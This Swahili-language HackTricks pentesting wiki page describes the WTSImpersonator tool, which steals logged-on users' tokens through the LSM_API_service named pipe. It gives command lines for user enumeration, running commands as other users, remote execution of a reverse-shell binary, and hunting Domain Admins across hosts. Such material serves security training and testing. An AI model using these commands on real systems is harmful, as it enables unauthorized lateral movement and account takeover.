# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

**WTS Impersonator** tool hutumia **"\\pipe\LSM_API_service"** RPC Named pipe kwa siri kuorodhesha watumiaji walioingia na kuteka nyara token zao, huku ikipita mbinu za jadi za Token Impersonation. Mbinu hii hurahisisha lateral movements bila usumbufu ndani ya mitandao. Ubunifu wa mbinu hii unatambuliwa kwa **Omri Baso, ambaye kazi yake inapatikana kwenye [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.<sup>[[1]](#references)</sup>

### Utendaji Mkuu

Tool hii hufanya kazi kupitia mfuatano wa API calls:
```bash
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Moduli Muhimu na Matumizi

- **Enumerating Users**: Uhesabuji wa watumiaji wa ndani na wa mbali unawezekana kwa kutumia tool hii, kwa kutumia commands za kila hali:

- Ndani:
```bash
.\WTSImpersonator.exe -m enum
```
- Kwa mbali, kwa kubainisha anwani ya IP au hostname:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Executing Commands**: Moduli za `exec` na `exec-remote` zinahitaji **Service** context ili kufanya kazi. Utekelezaji wa ndani unahitaji tu executable ya WTSImpersonator na command:

- Mfano wa utekelezaji wa command wa ndani:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe inaweza kutumika kupata service context:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Remote Command Execution**: Inahusisha kuunda na kusakinisha service kwa mbali, sawa na PsExec.exe, ili kuruhusu utekelezaji wenye permissions zinazofaa.

- Mfano wa utekelezaji wa mbali:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **User Hunting Module**: Hulenga watumiaji mahususi kwenye mashine nyingi, na kutekeleza code chini ya credentials zao. Hii ni muhimu hasa kwa kulenga Domain Admins walio na local admin rights kwenye mifumo kadhaa.
- Mfano wa matumizi:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

## Marejeo

- [1] [WTSImpersonator - GitHub](https://github.com/OmriBaso/WTSImpersonator)

{{#include ../../banners/hacktricks-training.md}}
